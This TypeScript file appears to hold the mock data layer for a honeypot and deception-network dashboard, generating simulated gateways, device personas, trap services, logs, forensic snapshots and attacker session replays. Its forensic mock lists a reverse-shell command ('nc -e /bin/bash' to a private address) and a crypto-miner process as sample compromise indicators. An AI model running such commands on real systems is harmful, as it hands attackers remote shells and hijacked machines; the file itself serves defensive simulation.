






import { Actor, ActorStatus, LogEntry, LogLevel, ProxyGateway, CloudTrap, ActiveTunnel, PendingActor, ProvisioningStatus, DevicePersona, WifiNetwork, BluetoothDevice, ForensicSnapshot, ForensicProcess, AttackSession } from '../types';

const LOCATIONS = ['Tel Aviv HQ', 'New York Branch', 'London DC', 'Frankfurt AWS'];
const PROCESSES = ['sshd', 'kernel', 'vpp-agent', 'udp_pot', 'cowrie'];

export const generateGateways = (): ProxyGateway[] => {
  return [
    {
      id: 'gw-tlv-01',
      name: 'TLV-Office-Proxy',
      location: 'Tel Aviv, IL',
      status: 'ONLINE',
      ip: '82.166.x.x',
      version: 'VPP-Proxy-2.1.0',
      connectedActors: 0,
      lat: 32.0853,
      lng: 34.7818
    },
    {
      id: 'gw-nyc-01',
      name: 'NYC-Finance-Proxy',
      location: 'New York, US',
      status: 'ONLINE',
      ip: '142.250.x.x',
      version: 'VPP-Proxy-2.1.0',
      connectedActors: 0,
      lat: 40.7128,
      lng: -74.0060
    },
    {
      id: 'gw-ldn-02',
      name: 'LDN-Cloud-Relay',
      location: 'London, UK',
      status: 'DEGRADED',
      ip: '52.95.x.x',
      version: 'VPP-Proxy-2.0.9',
      connectedActors: 0,
      lat: 51.5074,
      lng: -0.1278
    },
    {
        id: 'gw-sgp-01',
        name: 'SGP-APAC-Hub',
        location: 'Singapore, SG',
        status: 'OFFLINE',
        ip: '13.212.x.x',
        version: 'VPP-Proxy-2.0.0',
        connectedActors: 0,
        lat: 1.3521,
        lng: 103.8198
    }
  ];
};

export const AVAILABLE_PERSONAS: DevicePersona[] = [
    { 
        id: 'pers-linux', 
        name: 'Generic Linux Server', 
        icon: 'SERVER', 
        description: 'Emulates a standard Ubuntu 20.04 LTS footprint.', 
        openPorts: [80], 
        banner: 'SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.3', 
        macVendor: 'VMware, Inc.' 
    },
    { 
        id: 'pers-cam', 
        name: 'Axis Security Camera', 
        icon: 'CAMERA', 
        description: 'High-value target. Emulates an IP Camera login page.', 
        openPorts: [80, 554, 8080], 
        banner: 'Axis Network Camera 2.1 - RTSP Service Ready', 
        macVendor: 'Axis Communications AB' 
    },
    { 
        id: 'pers-printer', 
        name: 'HP Enterprise Printer', 
        icon: 'PRINTER', 
        description: 'Office printer with exposed admin console and PJL.', 
        openPorts: [80, 443, 631, 9100], 
        banner: 'HP JetDirect - JD019238', 
        macVendor: 'Hewlett Packard' 
    },
    { 
        id: 'pers-plc', 
        name: 'Siemens S7-1200', 
        icon: 'PLC', 
        description: 'Critical Infrastructure Controller (ICS/SCADA).', 
        openPorts: [102, 502], 
        banner: 'Siemens S7 Comm / Modbus TCP', 
        macVendor: 'Siemens AG' 
    },
    { 
        id: 'pers-router', 
        name: 'Cisco ISR Router', 
        icon: 'ROUTER', 
        description: 'Edge router with legacy telnet management enabled.', 
        openPorts: [23, 80], 
        banner: 'Cisco IOS Software, C2900 Software (C2900-UNIVERSALK9-M), Version 15.1(4)M4', 
        macVendor: 'Cisco Systems, Inc' 
    },
    // --- NEW PERSONAS ---
    { 
        id: 'pers-nas', 
        name: 'Synology NAS', 
        icon: 'SERVER', 
        description: 'Network Attached Storage with exposed management UI.', 
        openPorts: [80, 5000, 5001], 
        banner: 'Synology DiskStation Manager 7.1', 
        macVendor: 'Synology Inc.' 
    },
    { 
        id: 'pers-hue', 
        name: 'Philips Hue Bridge', 
        icon: 'ROUTER', 
        description: 'IoT Lighting Gateway. Common pivot point.', 
        openPorts: [80, 443, 8080], 
        banner: 'Philips Hue Bridge 2.0 API', 
        macVendor: 'Signify Netherlands B.V.' 
    },
    { 
        id: 'pers-win', 
        name: 'Windows Server 2022', 
        icon: 'SERVER', 
        description: 'Enterprise Domain Controller simulation.', 
        openPorts: [135, 139, 445, 3389], 
        banner: 'Microsoft Windows Server 2022 Datacenter', 
        macVendor: 'Microsoft Corporation' 
    },
    { 
        id: 'pers-med', 
        name: 'GE Healthcare MRI', 
        icon: 'PLC', 
        description: 'Vulnerable medical imaging device interface.', 
        openPorts: [80, 104, 443], 
        banner: 'GE Healthcare DICOM Server', 
        macVendor: 'General Electric Company' 
    },
    { 
        id: 'pers-unifi', 
        name: 'UniFi Controller', 
        icon: 'ROUTER', 
        description: 'Network management console for Ubiquiti devices.', 
        openPorts: [8080, 8443, 8880], 
        banner: 'UniFi Network Application 7.2.94', 
        macVendor: 'Ubiquiti Inc.' 
    }
];

export const generateInitialActors = (gateways: ProxyGateway[]): Actor[] => {
  const actors: Actor[] = [];
  
  gateways.forEach((gw, idx) => {
    // Generate 40-60 actors per gateway to simulate scale (Total ~150-200)
    const count = 40 + Math.floor(Math.random() * 20);
    for (let i = 0; i < count; i++) {
      const type = Math.random();
      let namePrefix = 'Node';
      let os = 'Ubuntu 22.04 LTS';
      
      if (type > 0.8) {
          namePrefix = 'Pi';
          os = 'Raspbian GNU/Linux 11 (bullseye)';
      } else if (type > 0.5) {
          namePrefix = 'Debian';
          os = 'Debian 11 (bullseye)';
      }

      actors.push({
        id: `puppet-${gw.id}-${i}`,
        proxyId: gw.id,
        name: `${namePrefix}-${gw.location.split(' ')[0].substring(0,3)}-${100 + i}`,
        localIp: `192.168.${10 + idx}.${100 + i}`,
        status: gw.status === 'OFFLINE' ? ActorStatus.UNREACHABLE : (Math.random() > 0.95 ? ActorStatus.COMPROMISED : ActorStatus.ONLINE),
        lastSeen: new Date(),
        osVersion: os,
        cpuLoad: Math.floor(Math.random() * 30) + 5,
        memoryUsage: Math.floor(Math.random() * 40) + 20,
        activeTools: ['vpp-agent', 'tcpdump'],
        protocolVersion: 'VPP-1.2',
        activeTunnels: [],
        deployedHoneyFiles: [],
        persona: AVAILABLE_PERSONAS[0],
        hasWifi: Math.random() > 0.5,
        hasBluetooth: Math.random() > 0.6,
        tcpSentinelEnabled: false
      });
    }
  });
  
  return actors;
};

export const generateRandomLog = (actors: Actor[]): LogEntry => {
  const actor = actors[Math.floor(Math.random() * actors.length)];
  const isAttack = Math.random() > 0.7;
  
  let level = LogLevel.INFO;
  let process = PROCESSES[Math.floor(Math.random() * PROCESSES.length)];
  let message = "VPP Heartbeat ack";
  let sourceIp = undefined;

  // --- NEW: TRAP INTERACTION SIMULATION ---
  // If the actor has active tunnels, simulate specific service logs
  if (actor.activeTunnels && actor.activeTunnels.length > 0 && Math.random() > 0.6) {
      const tunnel = actor.activeTunnels[Math.floor(Math.random() * actor.activeTunnels.length)];
      const trapType = tunnel.trap.serviceType;
      const attackerIp = `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
      
      // Override log details
      sourceIp = attackerIp;
      
      switch(trapType) {
          case 'Redis':
              process = 'redis-server';
              level = Math.random() > 0.8 ? LogLevel.WARNING : LogLevel.INFO;
              const redisMsgs = [
                  `Accepted ${attackerIp}:54322`, 
                  `(error) ERR unknown command 'config'`, 
                  `AUTH failed: invalid password from ${attackerIp}`
              ];
              message = redisMsgs[Math.floor(Math.random() * redisMsgs.length)];
              break;
          case 'RDP':
              process = 'xrdp-sesman';
              level = LogLevel.WARNING;
              message = `pam_unix(xrdp-sesman:auth): authentication failure; logname= uid=0 euid=0 tty=xrdp-sesman ruser= rhost= user=administrator`;
              break;
          case 'Oracle TNS':
              process = 'oracle';
              level = LogLevel.ERROR;
              message = `TNS-12535: TNS:operation timed out ns secondary err code: 12560 nt main err code: 505`;
              break;
          case 'MongoDB':
              process = 'mongod';
              level = LogLevel.WARNING;
              message = `[conn142]  authenticate db: admin { authenticate: 1, nonce: "xxx", user: "root", key: "xxx" }`;
              break;
          case 'FTP':
              process = 'vsftpd';
              level = LogLevel.WARNING;
              message = `[${attackerIp}] FAIL LOGIN: Client "::ffff:${attackerIp}"`;
              break;
          default:
              // Generic socat log for other types
              process = 'socat';
              level = LogLevel.INFO;
              message = `Redirection: Transferred ${Math.floor(Math.random() * 1024)} bytes to Cloud Trap (${trapType})`;
      }
      
      return {
        id: Math.random().toString(36).substring(7),
        timestamp: new Date(),
        actorId: actor.id,
        proxyId: actor.proxyId,
        actorName: actor.name,
        level,
        process,
        message,
        sourceIp
      };
  }

  // --- EXISTING LOGIC ---
  if (actor.tcpSentinelEnabled && Math.random() > 0.5) {
      // If Sentinel enabled, ANY random connection attempt is critical
      level = LogLevel.CRITICAL;
      process = 'kernel'; // or firewall
      sourceIp = `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
      const dstPort = Math.random() > 0.5 ? 22 : 443;
      message = `[SENTINEL ALERT] Inbound TCP Connection detected from ${sourceIp}:${Math.floor(Math.random()*60000)} -> :${dstPort} [SYN]`;
      
      // Auto-compromise state in simulation for effect
      if (actor.status === 'ONLINE') actor.status = ActorStatus.COMPROMISED;
  }
  else if (isAttack) {
    level = Math.random() > 0.5 ? LogLevel.WARNING : LogLevel.CRITICAL;
    process = 'sshd';
    const attackTypes = [
      "Failed password for invalid user admin",
      "Connection closed by 192.168.x.x port 44332 [preauth]",
      "Did not receive identification string from remote host",
      "Invalid user support from 103.2.x.x"
    ];
    message = attackTypes[Math.floor(Math.random() * attackTypes.length)];
    sourceIp = `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
  } else if (Math.random() > 0.9) {
    level = LogLevel.ERROR;
    message = "VPP-Agent: Proxy connection timeout - retrying";
  }

  return {
    id: Math.random().toString(36).substring(7),
    timestamp: new Date(),
    actorId: actor.id,
    proxyId: actor.proxyId,
    actorName: actor.name,
    level,
    process,
    message,
    sourceIp
  };
};

export const executeRemoteCommand = async (actorId: string, command: string, mockContext?: Actor): Promise<string> => {
  return new Promise((resolve) => {
    setTimeout(() => {
      if (command.startsWith('tcpdump')) {
        resolve(`[${actorId}] tcpdump: listening on eth0, capture size 262144 bytes\nCaptured 0 packets.`);
      } else if (command === 'status') {
        resolve(`[${actorId}] VPP Agent: Connected\nProxy Latency: 12ms\nUptime: 14 days`);
      } else if (command === 'reboot') {
        resolve(`[${actorId}] System is going down for reboot NOW!`);
      } else if (command.startsWith('socat')) {
        resolve(`[${actorId}] socat: Tunnel established successfully.`);
      } else if (command.includes('killall') || command.includes('pkill')) {
        resolve(`[${actorId}] Process terminated.`);
      } else if (command.startsWith('vpp-agent --set-persona')) {
        const match = command.match(/"([^"]+)"/);
        const name = match ? match[1] : 'Unknown';
        resolve(`
[VPP-AGENT] Initiating Persona Switch: "${name}"
[INFO] Stopping network services (eth0)... OK
[INFO] Randomizing MAC Address... 
      > OLD: B8:27:EB:AA:BB:CC (Raspberry Pi Foundation)
      > NEW: 00:1C:06:AF:3D:21 (Spoofed Vendor OUI)
[INFO] Flushing iptables... OK
[INFO] Applying new port rules...
      > ALLOW TCP/22
      > ALLOW TCP/80
      > ALLOW TCP/443
[INFO] Updating Service Banners (SSH/HTTP)... OK
[INFO] Restarting networking... OK
[SUCCESS] Device identity updated to "${name}".
        `);
      } else if (command.startsWith('vpp-agent --set-sentinel')) {
          const mode = command.includes('on') ? 'ON' : 'OFF';
          resolve(`
[SENTINEL MODE: ${mode}]
CONFIGURATION UPDATED
          `);
      } else if (command.includes('vpp-agent --factory-reset')) {
        resolve(`
[VPP-AGENT] Initiating Factory Reset...
[INFO] Stopping network services... OK
[INFO] Clearing tunnel configurations... OK
[INFO] Removing deception artifacts... OK
[INFO] Restoring default iptables policies... OK
[VPP-AGENT] Reset Complete. Agent is now in base state.
        `);
      } else if (command.includes('vpp-agent --update')) {
          resolve(`
[VPP-UPDATER] Checking for updates...
[INFO] Found version: v2.5.0-stable
[INFO] Downloading package (4.2MB)... [====================] 100%
[INFO] Verifying signature... OK
[INFO] Stopping vpp-agent service...
[INFO] Installing new binaries...
[INFO] Restarting service...
[VPP-AGENT] Update Successful. Running version v2.5.0.
          `);
      } else if (command.includes('apt-get update')) {
        resolve(`
Hit:1 http://archive.ubuntu.com/ubuntu jammy InRelease
Get:2 http://security.ubuntu.com/ubuntu jammy-security InRelease [110 kB]
Get:3 http://archive.ubuntu.com/ubuntu jammy-updates InRelease [119 kB]
Fetched 229 kB in 2s (115 kB/s)
Reading package lists... Done
[VPP-PROXY] Cached hits: 3, Upstream hits: 2
        `);
      } else if (command.includes('ss -lntup')) {
          // Dynamic Scan Result based on Actor Context
          let output = `Netid State      Recv-Q Send-Q Local Address:Port               Peer Address:Port              Process                                         
tcp   LISTEN      0      128          0.0.0.0:22                    0.0.0.0:*                  users:(("sshd",pid=812,fd=3))`;
          
          if (mockContext) {
              // Add Tunnels (socat)
              if (mockContext.activeTunnels) {
                  mockContext.activeTunnels.forEach((t, idx) => {
                      output += `\ntcp   LISTEN      0      5            0.0.0.0:${t.localPort}                  0.0.0.0:*                  users:(("socat",pid=${1000+idx},fd=4))`;
                  });
              }
              // Add Persona Ports (vpp-agent)
              if (mockContext.persona && mockContext.persona.openPorts) {
                  mockContext.persona.openPorts.forEach((p, idx) => {
                      // Avoid duplicates
                      if (!mockContext.activeTunnels?.some(t => t.localPort === p) && p !== 22) {
                         output += `\ntcp   LISTEN      0      128          0.0.0.0:${p}                    0.0.0.0:*                  users:(("vpp-agent",pid=${2000+idx},fd=5))`;
                      }
                  });
              }
          }
          resolve(output);
      } else if (command.includes('apt-get dist-upgrade')) {
        resolve(`
Reading package lists... Done
Building dependency tree... Done
Reading state information... Done
Calculating upgrade... Done
The following packages will be upgraded:
  libc-bin libc6 locales openssh-client openssh-server openssh-sftp-server
6 upgraded, 0 newly installed, 0 to remove and 0 not upgraded.
Need to get 4,320 kB of archives.
After this operation, 4,096 B of additional disk space will be used.
Get:1 http://archive.ubuntu.com/ubuntu jammy/main libc6 2.31-13 [2,752 kB]
Fetched 4,320 kB in 4s (1,080 kB/s)
[VPP-PROXY] Streamed 4.3 MB from Management Cache
(Reading database ... 45021 files and directories currently installed.)
Preparing to unpack .../libc6_2.31-13.deb ...
Unpacking libc6 ...
Setting up libc6 ...
Processing triggers for man-db ...
[OK] System Upgrade Complete.
        `);
      } else if (command.startsWith('vpp-route')) {
          resolve(`Routing table updated.`);
      } else if (command === 'hostname -I') {
          resolve(`192.168.1.101`);
      } else {
        resolve(`[${actorId}] bash: ${command}: command not found`);
      }
    }, 800 + Math.random() * 1000);
  });
};

// NEW: Cloud Trap Service Logic

export const getAvailableCloudTraps = (): CloudTrap[] => [
    { id: 'trap-oracle-01', name: 'Legacy Oracle DB', serviceType: 'Oracle TNS', description: 'Emulates an unpatched Oracle 11g instance.', riskLevel: 'HIGH' },
    { id: 'trap-win-rdp', name: 'Windows 2019 RDP', serviceType: 'RDP', description: 'High interaction Windows server with weak admin creds.', riskLevel: 'HIGH' },
    { id: 'trap-scada-plc', name: 'Siemens S7 PLC', serviceType: 'Industrial ICS', description: 'Simulated industrial controller for SCADA networks.', riskLevel: 'MEDIUM' },
    { id: 'trap-elastic', name: 'Open ElasticSearch', serviceType: 'ElasticSearch', description: 'Unsecured ES cluster with fake PII data.', riskLevel: 'MEDIUM' },
    // --- NEW TRAPS ---
    { id: 'trap-redis', name: 'Redis Cache', serviceType: 'Redis', description: 'Unauthenticated Redis instance with write access.', riskLevel: 'HIGH' },
    { id: 'trap-mongo', name: 'MongoDB NoSQL', serviceType: 'MongoDB', description: 'Open MongoDB 4.0 instance.', riskLevel: 'MEDIUM' },
    { id: 'trap-ftp', name: 'VSFTPD 2.3.4', serviceType: 'FTP', description: 'Legacy FTP server with backdoor vulnerability.', riskLevel: 'HIGH' },
    { id: 'trap-telnet', name: 'Legacy Telnet', serviceType: 'Telnet', description: 'Unencrypted remote management interface.', riskLevel: 'LOW' },
    { id: 'trap-vnc', name: 'VNC Remote Desktop', serviceType: 'VNC', description: 'RFB 3.8 protocol without password.', riskLevel: 'MEDIUM' },
    { id: 'trap-postgres', name: 'PostgreSQL DB', serviceType: 'PostgreSQL', description: 'Default postgres user with trust auth.', riskLevel: 'MEDIUM' }
];

export const toggleTunnelMock = async (actor: Actor, trapId: string, localPort: number): Promise<ActiveTunnel> => {
    return new Promise((resolve) => {
        setTimeout(() => {
            const trap = getAvailableCloudTraps().find(t => t.id === trapId)!;
            resolve({
                id: `tun-${Math.random().toString(36).substr(2,5)}`,
                trap,
                localPort,
                remoteEndpoint: `cloud-trap-vnet.internal:${localPort + 10000}`,
                status: 'ACTIVE',
                bytesTransferred: 0,
                uptimeSeconds: 0
            });
        }, 1500);
    });
};

// NEW: Enrollment Mock Logic

export const generateEnrollmentToken = () => {
    return `vpp_${Math.random().toString(36).substr(2, 9)}_${Date.now()}`;
};

export const simulateDeviceCallHome = async (): Promise<PendingActor> => {
    return new Promise((resolve) => {
        setTimeout(() => {
            const hex = '0123456789ABCDEF';
            let mac = '';
            for (let i = 0; i < 6; i++) {
                mac += hex.charAt(Math.floor(Math.random() * 16));
                mac += hex.charAt(Math.floor(Math.random() * 16));
                if (i < 5) mac += ':';
            }
            
            resolve({
                id: `temp_${Math.random().toString(36).substr(2, 6)}`,
                hwid: mac,
                detectedIp: `10.0.${Math.floor(Math.random() * 20)}.${Math.floor(Math.random() * 255)}`,
                detectedAt: new Date(),
                status: ProvisioningStatus.WAITING_APPROVAL
            });
        }, 3000); // Takes 3 seconds to "boot" and connect
    });
};

// NEW: Wireless Recon Mock Data

export const generateMockWifi = (actors: Actor[]): WifiNetwork[] => {
    const networks: WifiNetwork[] = [];
    const ssids = ['Corp-Guest', 'Starbucks_Free_WiFi', 'iPhone (13)', 'HP-Print-35', 'Unknown Network', 'D-Link_2.4', 'xfinitywifi'];
    
    // Safety check in case actors is undefined or empty
    const availableActors = actors.filter(a => a.status === 'ONLINE');
    if (availableActors.length === 0) return [];

    availableActors.forEach(actor => {
        const count = Math.floor(Math.random() * 5);
        for(let i=0; i<count; i++) {
            networks.push({
                id: `wifi-${Math.random().toString(36).substr(2,6)}`,
                ssid: ssids[Math.floor(Math.random() * ssids.length)],
                bssid: `XX:XX:XX:${Math.floor(Math.random()*99)}:${Math.floor(Math.random()*99)}`,
                signalStrength: -40 - Math.floor(Math.random() * 50),
                security: Math.random() > 0.8 ? 'OPEN' : 'WPA2',
                channel: Math.floor(Math.random() * 11) + 1,
                actorId: actor.id,
                actorName: actor.name,
                lastSeen: new Date()
            });
        }
    });
    return networks;
};

export const generateMockBluetooth = (actors: Actor[]): BluetoothDevice[] => {
     const devices: BluetoothDevice[] = [];
     const names = ['JBL Flip 5', 'AirPods Pro', 'Fitbit Charge 5', 'Unknown', 'Samsung TV', 'Tile Tracker'];
     
     const availableActors = actors.filter(a => a.status === 'ONLINE');
     if (availableActors.length === 0) return [];

     availableActors.forEach(actor => {
        const count = Math.floor(Math.random() * 4);
        for(let i=0; i<count; i++) {
            devices.push({
                id: `bt-${Math.random().toString(36).substr(2,6)}`,
                name: names[Math.floor(Math.random() * names.length)],
                mac: `AA:BB:CC:${Math.floor(Math.random()*99)}:${Math.floor(Math.random()*99)}`,
                rssi: -50 - Math.floor(Math.random() * 40),
                type: Math.random() > 0.5 ? 'BLE' : 'CLASSIC',
                actorId: actor.id,
                actorName: actor.name,
                lastSeen: new Date()
            });
        }
    });
    return devices;
};

// NEW: One-Click Forensic Mock
export const performForensicScan = async (actorId: string, mockContext?: Actor): Promise<ForensicSnapshot> => {
    return new Promise((resolve) => {
        setTimeout(() => {
            let processes: ForensicProcess[] = [
                { pid: '1', user: 'root', cpu: '0.1', mem: '0.5', command: '/sbin/init', risk: 'LOW' },
                { pid: '812', user: 'root', cpu: '0.2', mem: '1.2', command: '/usr/sbin/sshd -D', risk: 'LOW' },
                { pid: '2023', user: 'pi', cpu: '0.0', mem: '0.8', command: '-bash', risk: 'LOW' },
            ];

            let connections = [
                'tcp   ESTAB      0      0          192.168.1.101:22          10.0.0.5:54322         users:(("sshd",pid=812,fd=3))',
                'tcp   LISTEN     0      128        0.0.0.0:80                0.0.0.0:*              users:(("apache2",pid=900,fd=3))'
            ];

            // DYNAMIC: Add Socat Tunnels if they exist
            if (mockContext && mockContext.activeTunnels) {
                mockContext.activeTunnels.forEach((t, i) => {
                    const pid = 3000 + i;
                    // Add Socat Process
                    processes.push({ 
                        pid: pid.toString(), 
                        user: 'root', 
                        cpu: '0.5', 
                        mem: '1.1', 
                        command: `socat TCP-LISTEN:${t.localPort},fork SYSTEM:echo...`, 
                        risk: 'MEDIUM' 
                    });
                    
                    // Add ESTABLISHED connection simulating trap hit
                    const attackerIp = `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.1.5`;
                    connections.push(`tcp   ESTAB      0      0          0.0.0.0:${t.localPort}          ${attackerIp}:49152    users:(("socat",pid=${pid},fd=4))`);
                });
            }

            // Suspicious items (Randomly add if no tunnels, or always if compromised)
            if (mockContext?.status === 'COMPROMISED') {
                processes.push({ pid: '4452', user: 'www-data', cpu: '45.2', mem: '12.4', command: './xmrig --donate-level 1', risk: 'HIGH' });
                processes.push({ pid: '4490', user: 'www-data', cpu: '0.1', mem: '0.2', command: 'nc -e /bin/bash 192.168.1.55 4444', risk: 'HIGH' });
                connections.push('tcp   ESTAB      0      0          192.168.1.101:4444        192.168.1.55:8888      users:(("nc",pid=4490,fd=3))');
            }

            const authLogs = [
                'Oct 12 04:12:01 sshd[1202]: Accepted password for pi from 10.0.0.5 port 54322 ssh2',
                'Oct 12 04:12:01 systemd-logind[455]: New session 32 of user pi.',
                'Oct 12 04:15:22 sudo: pi : TTY=pts/0 ; PWD=/home/pi ; USER=root ; COMMAND=/bin/bash',
                'Oct 12 04:15:22 sudo: pam_unix(sudo:session): session opened for user root by pi(uid=0)',
                'Oct 12 04:20:01 CRON[2201]: pam_unix(cron:session): session opened for user root by (uid=0)'
            ];

            const openFiles = [
                'apache2  900 root  cwd   DIR  179,2     4096      2 /',
            ];
            
            // Add open files for tunnels
             if (mockContext && mockContext.activeTunnels) {
                mockContext.activeTunnels.forEach((t, i) => {
                     openFiles.push(`socat    ${3000+i} root  cwd   DIR  179,2     4096      2 /`);
                     openFiles.push(`socat    ${3000+i} root  3u   IPv4  ${20000+i}      0t0  TCP *:${t.localPort} (LISTEN)`);
                });
             }

            if (mockContext?.status === 'COMPROMISED') {
                 openFiles.push('nc      4490 www-data  txt   REG  179,2    31248 14221 /usr/bin/nc.openbsd');
                 openFiles.push('xmrig   4452 www-data  cwd   DIR  179,2     4096  3321 /tmp/.X11-unix');
            }

            resolve({
                timestamp: new Date(),
                processes,
                connections,
                authLogs,
                openFiles
            });
        }, 2000);
    });
};

// --- NEW: GHOST MODE (SESSION REPLAY) ---
export const getAttackSessions = async (actorId: string, actorContext?: Actor): Promise<AttackSession[]> => {
    return new Promise((resolve) => {
        setTimeout(() => {
             const sessions: AttackSession[] = [];
             
             // 2. Dynamic Traps (Real-time generation from context)
             if (actorContext && actorContext.activeTunnels) {
                 actorContext.activeTunnels.forEach(t => {
                     const fakeIp = `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;

                     // Check service type from trap definition or tunnel name
                     if (t.trap.serviceType === 'FTP' || t.trap.name.includes('VSFTPD')) {
                         sessions.push({
                            id: `sess-ftp-${t.id}-${Date.now()}`,
                            actorId,
                            attackerIp: fakeIp,
                            protocol: 'FTP',
                            startTime: new Date(Date.now() - Math.random() * 60000), // Very Recent (last 60s)
                            durationSeconds: 5,
                            frames: [
                                { time: 100, type: 'OUTPUT', data: '220 (vsFTPd 2.3.4)\r\n' },
                                { time: 1500, type: 'INPUT', data: 'USER admin\r\n' },
                                { time: 1600, type: 'OUTPUT', data: '331 Please specify the password.\r\n' },
                                { time: 3000, type: 'INPUT', data: 'PASS password123\r\n' },
                                { time: 3200, type: 'OUTPUT', data: '530 Login incorrect.\r\n' },
                                { time: 4500, type: 'INPUT', data: 'QUIT\r\n' },
                                { time: 4600, type: 'OUTPUT', data: '221 Goodbye.\r\n' }
                            ]
                         });
                     } else if (t.trap.serviceType === 'Redis') {
                          sessions.push({
                            id: `sess-redis-${t.id}-${Date.now()}`,
                            actorId,
                            attackerIp: fakeIp,
                            protocol: 'REDIS',
                            startTime: new Date(Date.now() - Math.random() * 60000), // Very Recent (last 60s)
                            durationSeconds: 4,
                            frames: [
                                { time: 100, type: 'INPUT', data: 'CONFIG GET *\r\n' },
                                { time: 200, type: 'OUTPUT', data: '(error) NOAUTH Authentication required.\r\n' },
                                { time: 1500, type: 'INPUT', data: 'AUTH root\r\n' },
                                { time: 1600, type: 'OUTPUT', data: '(error) ERR invalid password\r\n' },
                                { time: 3000, type: 'INPUT', data: 'quit\r\n' }
                            ]
                         });
                     }
                 });
             }
             
             resolve(sessions);
        }, 800);
    });
};

export const deleteAttackSession = async (sessionId: string): Promise<boolean> => {
    // In mock, we just pretend it succeeded. 
    // In a real implementation, this would delete from DB.
    // The frontend handles the immediate removal from UI state.
    return new Promise(resolve => setTimeout(() => resolve(true), 200));
};
